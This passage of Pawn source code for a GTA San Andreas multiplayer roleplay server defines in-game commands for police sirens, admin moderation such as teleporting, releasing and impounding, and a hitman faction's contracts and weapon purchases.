		format(szMessage, sizeof(szMessage), "HQ: All sirens have been destroyed by %s.", GetPlayerNameEx(playerid));
		SendRadioMessage(1, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(2, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(3, TEAM_BLUE_COLOR, szMessage);
		SendRadioMessage(5, TEAM_BLUE_COLOR, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer or R4+.");
	return 1;
}

CMD:siren(playerid, params[]) {
	if(IsACop(playerid)) {
	    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
			if(IsABoat(GetPlayerVehicleID(playerid)) || IsAPlane(GetPlayerVehicleID(playerid)) || IsABike(GetPlayerVehicleID(playerid)) || IsAHelicopter(GetPlayerVehicleID(playerid)))
				return SendClientMessage(playerid, COLOR_GREY, "You can't use a siren on this type of vehicle.");

			switch(GetVehicleModel(GetPlayerVehicleID(playerid))) {
			    case 416, 523, 427, 490, 528, 407, 544, 601: {
                    SendClientMessage(playerid, COLOR_GREY, "This vehicle already has a siren.");
				}
				case 596, 597, 598, 599: {
					if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
			            DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
			        }
					SetPVarInt(playerid, "SirenO", CreateDynamicObject(19419, 10.0, 10.0, 10.0, 0, 0, 0, 0, 0, -1));
			        if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 596) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.379999, 0.889999, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 597) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.374999, 0.884999, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 598) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, -0.334498, 0.933500, 0.000000, 0.000000, 0.000000);
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 599) AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), 0.000000, 0.039999, 1.153999, 0.000000, 0.000000, 0.000000);
					else return SendClientMessage(playerid, COLOR_GREY, "You can't use a siren on this type of vehicle.");
			        SendClientMessage(playerid, COLOR_WHITE, "Siren attached.");
				}
			    default: {
			        if(IsValidDynamicObject(GetPVarInt(playerid, "SirenO")) && GetPVarInt(playerid, "SirenO") > 0) {
			            DestroyDynamicObject(GetPVarInt(playerid, "SirenO"));
			        }
					SetPVarInt(playerid, "SirenO", CreateDynamicObject(18646, 10.0, 10.0, 10.0, 0, 0, 0, 0, 0, -1));
			        AttachDynamicObjectToVehicle(GetPVarInt(playerid, "SirenO"), GetPlayerVehicleID(playerid), -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);
			        SendClientMessage(playerid, COLOR_WHITE, "Siren attached.");
			    }
			}
	    } else SendClientMessage(playerid, COLOR_GREY, "You must be the driver of a vehicle to attach a siren to it.");
	} else SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	return 1;
}

CMD:takeweapons(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /takeadminweapons [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			ResetPlayerWeaponsEx(giveplayerid);
			format(string,sizeof(string),"You have removed %s's weapons.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:sendtols(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /sendtols [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pAdmin] >= PlayerInfo[playerid][pAdmin] && AdminDuty[giveplayerid] == 1)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't perform this action on an equal or higher level admin that is on-duty.");
				return 1;
			}
			format(string, sizeof(string), " You have sent %s to Los Santos.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			SendClientMessage(giveplayerid, COLOR_WHITE, "You have been teleported!");
			SetPlayerPos(giveplayerid, 1529.6,-1691.2,13.3);
			SetPlayerVirtualWorld(giveplayerid, 0);
			SetPlayerInterior(giveplayerid, 0);
			PlayerInfo[giveplayerid][pInt] = 0;
			PlayerInfo[giveplayerid][pVW] = 0;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:release(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			giveplayerid,
			reason[64];

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /release [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pJailTime] == 0)
				return SendClientMessage(playerid, COLOR_GRAD1, "The player you have selected is not current in prison.");

			format(string, sizeof(string), "AdmCmd: %s has been released from prison by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			format(string, sizeof(string), "AdmCmd: %s has been released from prison by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			SendClientMessageToAllEx(COLOR_LIGHTRED, string);

			if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
				IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
				PlayerDragged[giveplayerid] = 0;
				PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
			}
			PlayerInfo[giveplayerid][pJailed] = 0;
			PlayerInfo[giveplayerid][pWantedLevel] = 0;
			SetPlayerToTeamColor(giveplayerid);
			SetPlayerWantedLevel(giveplayerid, 0);
			PlayerInfo[giveplayerid][pJailTime] = 0;
			SetPlayerPos(giveplayerid, 1529.6,-1691.2,13.3);
			SetPlayerInterior(giveplayerid,0);
			PlayerInfo[giveplayerid][pInt] = 0;
			SetPlayerVirtualWorld(giveplayerid, 0);
			PlayerInfo[giveplayerid][pVW] = 0;
			PhoneOnline[giveplayerid] = 0;
			if(IsPlayerAttachedObjectSlotUsed(giveplayerid, 0))
				RemovePlayerAttachedObject(giveplayerid, 0);
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	} else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:forcedeath(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /forcedeath [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Injured") == 1)
			{
				format(string, sizeof(string), " You have forced %s to death.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "You have been forced to death by an Admin.");
				KillEMSQueue(giveplayerid);
				ResetPlayerWeaponsEx(giveplayerid);
				SpawnPlayer(giveplayerid);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is not injured!");
			}
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:forcehospital(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /forcehospital [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GetPVarInt(giveplayerid, "Hospital") > 0)
			{
				format(string, sizeof(string), " You have forced %s out of the hospital.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
				SendClientMessage(giveplayerid, COLOR_WHITE, "You have been forced out of the hospital by an Admin.");
				DeletePVar(giveplayerid, "HospitalTimer");
				HospitalSpawn(giveplayerid);
				DeletePVar(giveplayerid, "Hospital");
				DeletePVar(giveplayerid, "MedicBill");
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "That player is not in the hospital!");
			}
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:flipveh(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");

    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(IsPlayerInAnyVehicle(playerid))
	{
		new Float:zAngle;
		GetVehicleZAngle(GetPlayerVehicleID(playerid), zAngle);
		SetVehicleZAngle(GetPlayerVehicleID(playerid), zAngle);
		SendClientMessageEx(playerid, COLOR_WHITE, "Your vehicle has been flipped back over.");
	}
	else
	{
		SendClientMessageEx(playerid, COLOR_GRAD1, "You must be in a vehicle to use this command.");
	}
	return 1;
}

CMD:reloadpvehicles(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    {
    	SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   }

	new string[128], giveplayerid;
	if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /reloadpvehicles [playerid/partofname]");

	UnloadPlayerVehicles(giveplayerid);
	LoadPlayerVehicles(giveplayerid);

	format(string, sizeof(string), " You have successfully reloaded %s's Vehicles.", GetPlayerNameEx(giveplayerid));
	SendClientMessage(playerid, COLOR_GREY, string);

	return 1;
}

CMD:apark(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3)
	{
    	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    	{
    		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}
        foreach(Player, ownerid)
        {
			for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
			{
				if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
				{
				    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "You must be in the driver seat.");
					new Float:x, Float:y, Float:z, Float:angle, Float:health;
					if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
					if(IsARC(GetPlayerVehicleID(playerid))) // RC Vehicles
					{
						new Float:vehPos[3];
						GetVehiclePos(GetPlayerVehicleID(playerid),vehPos[0], vehPos[1], vehPos[2]);
						SetPlayerPos(playerid,vehPos[0], vehPos[1]+0.5, vehPos[2]+0.5);
					}
					GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
					GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
					GetVehicleZAngle(PlayerVehicleInfo[ownerid][d][pvId], angle);
					SurfingCheck(GetPlayerVehicleID(playerid));
					UpdatePlayerVehicleParkPosition(ownerid, d, x, y, z, angle, health);
					PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
				 	SetPlayerArmedWeapon(playerid, 0);

				 	new szMessage[128];

				 	format(szMessage, sizeof(szMessage),"You have parked %s's %s.",GetPlayerNameEx(ownerid), VehicleName[PlayerVehicleInfo[ownerid][d][pvModelId] - 400]);
					SendClientMessage(playerid, COLOR_WHITE, szMessage);

					format(szMessage, sizeof(szMessage), "Your %s has been parked at another location by an admin. Use /trackcar to find it.", VehicleName[PlayerVehicleInfo[ownerid][d][pvModelId] - 400]);
					SendClientMessage(ownerid, COLOR_WHITE, szMessage);
					return 1;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:aimpound(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] >= 3)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    	{
    		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
   		}

		new
			iVehType,
			iVehIndex,
			iTargetOwner,
			iVehTowed;
        if(sscanf(params, "d", iVehTowed)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /aimpound [carid]");

		foreach(Player, i) {
			iVehIndex = GetPlayerVehicle(i, iVehTowed);
			if(iVehIndex != -1) {
				iVehType = 1;
				iTargetOwner = i;
				break;
			}
		}
		if(!iVehType) {
			for(new i; i < MAX_FAMILY; ++i) {
				iVehIndex = GetGangVehicle(i, iVehTowed);
				if(iVehIndex != -1) {
					iVehType = 2;
					iTargetOwner = i;
					break;
				}
			}
		}
		switch(iVehType) {
			case 0, 2: {
				SendClientMessage(playerid, COLOR_GRAD1, "You can't impound this vehicle, it has been respawned instead.");
				DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
				SetVehicleToRespawn(iVehTowed);
			}
			case 1: {

				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvImpounded] = 1;
				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvSpawned] = 0;
				PlayerVehicleInfo[iTargetOwner][iVehIndex][pvId] = INVALID_PLAYER_VEHICLE_ID;
				DestroyVehicle(iVehTowed);
				VehicleRadioStation[iVehTowed] = 0;

				VehicleSpawned[iTargetOwner]--;
				--PlayerCars;

				new
					szMessage[96];

				format(szMessage, sizeof(szMessage),"You have impounded %s's %s.",GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);

				format(szMessage, sizeof(szMessage), "Your %s has been impounded by an admin. You may release it at the DMV in Dillimore.", VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
				SendClientMessage(iTargetOwner, COLOR_WHITE, szMessage);

			}
		}
		arr_Towing[playerid] = INVALID_VEHICLE_ID;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:respawncar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 3)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], carid;
		if(sscanf(params, "d", carid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /respawncar [carid]");

		SetVehicleToRespawn(carid);
		format(string, sizeof(string), "You have respawned vehicle ID %d.", carid);
		SendClientMessage(playerid, COLOR_GREY, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:respawncars(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 3) {
	    if(isnull(params))
	        return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /respawncars [radius]");

 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid, COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], radius = strval(params);

		if(radius < 1 || radius > 40)
			return SendClientMessage(playerid, COLOR_WHITE, "Radius must be higher than 0 and lower than 41!");

		RespawnNearbyVehicles(playerid, radius);
		format(string, sizeof(string), "You have respawned all vehicles within a radius of %d.", radius);
		SendClientMessage(playerid, COLOR_GREY, string);
	} else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	return 1;
}

CMD:contracts(playerid, params[])
{
    if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4 || (PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1))
	{
        SearchingHit(playerid);
    }
    return 1;
}

CMD:givehit(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pRank] < 5)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Only ranks 5 and above can assign contracts to people!");
			return 1;
		}

		new string[128], giveplayerid, targetid;
		if(sscanf(params, "uu", giveplayerid, targetid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givehit [playerid/partofname] [targetid]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(GoChase[giveplayerid] < 999)
			{
				SendClientMessage(playerid, COLOR_GREY, "   That Hitman is already busy with a Contract!");
				return 1;
			}
			if(GotHit[targetid] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Another hitman has already assigned this target!");
				return 1;
			}
			if(IsPlayerConnected(targetid))
			{
				if(PlayerInfo[targetid][pHeadValue] == 0)
				{
					SendClientMessage(playerid, COLOR_GREY, "   That target doesn't have a contract on them!");
					return 1;
				}

				format(string, sizeof(string), "* You offered %s a contract to kill %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(targetid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Hitman %s has offered you a contract to kill %s (type /accept contract), to accept it.", GetPlayerNameEx(playerid), GetPlayerNameEx(targetid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				HitOffer[giveplayerid] = playerid;
				HitToGet[giveplayerid] = targetid;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "   The contracted person is offline, use /contracts!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   That Hitman is not Online!");
			return 1;
		}
	}
	return 1;
}

CMD:givemehit(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		new string[128], targetid;
		if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givemehit [targetid]");

		if(IsPlayerConnected(targetid))
		{
			if(GoChase[playerid] < 999)
			{
				SendClientMessage(playerid, COLOR_GREY, "   You're already busy with another contract!");
				return 1;
			}
			if(GotHit[targetid] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Another hitman has already assigned this target!");
				return 1;
			}
			if(PlayerInfo[targetid][pHeadValue] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "   That target doesn't have a contract on them!");
				return 1;
			}
			format(string, sizeof(string), "* You have offered yourself a contract to kill %s. (type /accept contract)", GetPlayerNameEx(targetid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			HitOffer[playerid] = playerid;
			HitToGet[playerid] = targetid;
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   The contracted person is offline, use /contracts!");
			return 1;
		}
	}
	return 1;
}

CMD:order(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
	    if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");
		if(IsPlayerInRangeOfPoint(playerid, 20.0, 1236.112182, -751.863220, 5080.765136))
		{
			if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");
			new Hitman[32], skin = -1;
			if(sscanf(params, "s[32]D", Hitman, skin))
			{
				SendClientMessage(playerid, COLOR_WHITE, "USAGE: /order [name]");
				SendClientMessage(playerid, COLOR_GRAD2, " Rank 1: Knife ($80), SDPistol ($100), Shotgun ($150), Skin ($250), Deagle ($500), MP5 ($250), Kevlar Vest ($600)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rank 2: Rifle ($300), AK47 ($1,000), M4 ($1,200)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rank 3: SPAS12 ($3,500), Sniper ($3,500)");
				SendClientMessage(playerid, COLOR_GRAD2, " Rank 4: C4 ($5000)");
				return 1;
			}
			else if(strcmp(Hitman,"skin",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1) {
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that!");
				}
				else if(IsInvalidSkin(skin)) {
					SendClientMessage(playerid, COLOR_WHITE, "USAGE: /order skin [skin ID]");
				}
				else if(GetPlayerCash(playerid) >= 250) {
					SetPlayerSkin(playerid, skin);
					PlayerInfo[playerid][pSkin] = skin;
					GivePlayerCash(playerid, -250);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"You have purchased a skin!");
				}
				else SendClientMessage(playerid, COLOR_GREY,"   You can't afford that!");
			}
			else if(strcmp(Hitman,"Knife",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 80)
				{
					GivePlayerValidWeapon(playerid, 4, 3);
					GivePlayerCash(playerid, -80);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a knife!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"SDPistol",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 100)
				{
					GivePlayerValidWeapon(playerid, 23, 99999);
					GivePlayerCash(playerid, -100);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a silenced pistol!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Shotgun",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 150)
				{
					GivePlayerValidWeapon(playerid, 25, 99999);
					GivePlayerCash(playerid, -150);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a shotgun!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Deagle",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) > 500)
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerCash(playerid, -500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a Desert Eagle!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"MP5",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 250)
				{
					GivePlayerValidWeapon(playerid, 29, 99999);
					GivePlayerCash(playerid, -250);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased an MP5!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Rifle",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 300)
				{
					GivePlayerValidWeapon(playerid, 33, 99999);
					GivePlayerCash(playerid, -300);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a rifle!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"AK47",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon (2+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 1000)
				{
					GivePlayerValidWeapon(playerid, 30, 99999);
					GivePlayerCash(playerid, -1000);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased an AK-47!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"M4",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon (2+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 1200)
				{
					GivePlayerValidWeapon(playerid, 31, 99999);
					GivePlayerCash(playerid, -1200);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased an M4!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Vest",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 600)
				{
					SetPlayerArmourEx(playerid, 100);
					GivePlayerCash(playerid, -600);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a kevlar vest!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Spas12",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon (3+!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 3500)
				{
					GivePlayerValidWeapon(playerid, 27, 99999);
					GivePlayerCash(playerid, -3500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a SPAS-12!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Sniper",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "You're not the required rank for that weapon (3+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 3500)
				{
					GivePlayerValidWeapon(playerid, 34, 99999);
					GivePlayerCash(playerid, -3500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased a sniper rifle!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"C4",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 4)
				{
					SendClientMessage(playerid, COLOR_GREY, "YYou're not the required rank for that weapon (4+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 5000)
				{
					PlayerInfo[playerid][pC4Get] = 1;
					PlayerInfo[playerid][pBombs]++;
					GivePlayerCash(playerid, -5000);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   You have purchased one block of C4!");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   You can't afford that package!");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You're not at the gun shack!");
